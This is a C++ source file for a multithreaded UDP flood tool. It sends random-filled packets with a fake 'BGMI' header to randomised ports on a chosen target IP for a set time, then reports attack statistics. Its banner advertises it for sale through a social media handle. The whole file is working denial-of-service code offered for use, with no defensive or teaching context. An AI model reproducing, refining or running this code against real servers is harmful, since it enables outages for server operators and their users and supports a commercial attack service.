#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <cstring>
#include <chrono>
#include <mutex>
#include <random>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <atomic>

#define MAX_PACKET_SIZE 65507
#define MIN_PACKET_SIZE 1
#define BASE_RETRY_DELAY 20 // Base delay in ms for retries
#define MAX_THREADS 1024 // Cap to avoid system crash

std::atomic<long long> totalPacketsSent(0);
std::atomic<long long> totalSendFailures(0);
std::atomic<long long> totalSendAttempts(0);
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;

void countdown(int duration) {
    for (int i = duration; i > 0 && keepSending; --i) {
        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    std::cout << "\rTime Left: 0 seconds" << std::endl;
    keepSending = false;
}

void packetSender(int threadId, const std::string& targetIp, int baseTargetPort, int durationSeconds, int packetSize, int numThreads) {
    int udpSocket;
    struct sockaddr_in serverAddr;
    char* packet = new char[packetSize];
    std::srand(threadId + time(nullptr));

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        std::cerr << "Thread " << threadId << ": Socket creation failed, errno: " << errno << "\n";
        delete[] packet;
        return;
    }

    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in localAddr;
    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port = 0;
    if (bind(udpSocket, (struct sockaddr*)&localAddr, sizeof(localAddr)) < 0) {
        std::cerr << "Thread " << threadId << ": Bind failed, errno: " << errno << "\n";
        close(udpSocket);
        delete[] packet;
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());

    std::string fakeHeader = "BGMI" + std::to_string(rand() % 9999) + "|" + std::to_string(threadId % 100) + ":";
    int headerLen = std::min((int)fakeHeader.length(), packetSize);
    std::memcpy(packet, fakeHeader.c_str(), headerLen);
    for (int i = headerLen; i < packetSize - 1; i++) {
        packet[i] = rand() % 256;
    }
    packet[packetSize - 1] = '\0';

    long long threadPackets = 0;
    long long threadFailures = 0;
    long long threadAttempts = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        int targetPort = baseTargetPort + (rand() % 2000);
        serverAddr.sin_port = htons(targetPort);

        int burstSize = 3; // Reduced burst size
        int successfulSends = 0;
        int maxRetries = 5;
        for (int burst = 0; burst < burstSize && keepSending; burst++) {
            int retries = 0;
            while (retries < maxRetries) {
                threadAttempts++;
                totalSendAttempts++;
                ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0,
                                         (struct sockaddr*)&serverAddr, sizeof(serverAddr));
                if (bytesSent > 0) {
                    threadPackets++;
                    threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
                    successfulSends++;
                    break;
                } else if (bytesSent < 0) {
                    retries++;
                    if (errno == EAGAIN || errno == EWOULDBLOCK) {
                        std::cerr << "Thread " << threadId << ": Send failed (EAGAIN), retry " << retries << ", errno: " << errno << "\n";
                        std::this_thread::sleep_for(std::chrono::milliseconds(BASE_RETRY_DELAY * (retries + 1))); // Dynamic delay
                    } else {
                        std::cerr << "Thread " << threadId << ": Send failed, retry " << retries << ", errno: " << errno << "\n";
                        threadFailures++;
                        break;
                    }
                    if (retries == maxRetries) {
                        threadFailures++;
                        break;
                    }
                }
            }
        }
        totalPacketsSent += successfulSends;
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Small delay between bursts
    }

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalSendFailures += threadFailures;
        totalDataMB += threadDataMB;
    }

    close(udpSocket);
    delete[] packet;
}

int main(int argc, char* argv[]) {
    std::cout << "=======================================\n";
    std::cout << "  Welcome to Rohan Server\n";
    std::cout << "  This is fully working script\n";
    std::cout << "  DM to buy at - @Rohan2349\n";
    std::cout << "=======================================\n\n";

    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size> <threads>\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int baseTargetPort;
    int durationSeconds;
    int packetSize;
    int numThreads;

    try {
        baseTargetPort = std::stoi(argv[2]);
        durationSeconds = std::stoi(argv[3]);
        packetSize = std::stoi(argv[4]);
        numThreads = std::stoi(argv[5]);
    } catch (const std::exception& e) {
        std::cerr << "Invalid argument format\n";
        return 1;
    }

    if (packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE) {
        std::cerr << "Packet size must be between " << MIN_PACKET_SIZE << " and " << MAX_PACKET_SIZE << "\n";
        return 1;
    }
    if (numThreads < 1 || numThreads > MAX_THREADS) {
        std::cerr << "Threads must be between 1 and " << MAX_THREADS << "\n";
        return 1;
    }

    std::cout << "\nAttack started!\n";
    std::vector<std::thread> threads;
    for (int i = 0; i < numThreads; i++) {
        threads.emplace_back(packetSender, i, targetIp, baseTargetPort, durationSeconds, packetSize, numThreads);
    }

    std::thread countdownThread(countdown, durationSeconds);
    countdownThread.join();

    keepSending = false;
    for (auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    double failureRate = totalSendAttempts > 0 ? (static_cast<double>(totalSendFailures) / totalSendAttempts) * 100.0 : 0.0;
    std::cout << "\nATTACK_COMPLETED\n";
    std::cout << "FAILURE_RATE:" << failureRate << "\n";
    std::cout << "TOTAL_PACKETS_SENT:" << totalPacketsSent << "\n";
    std::cout << "TOTAL_DATA_MB:" << totalDataMB << "\n";
    std::cout << "DM to buy at - @Rohan2349\n";
    return 0;
}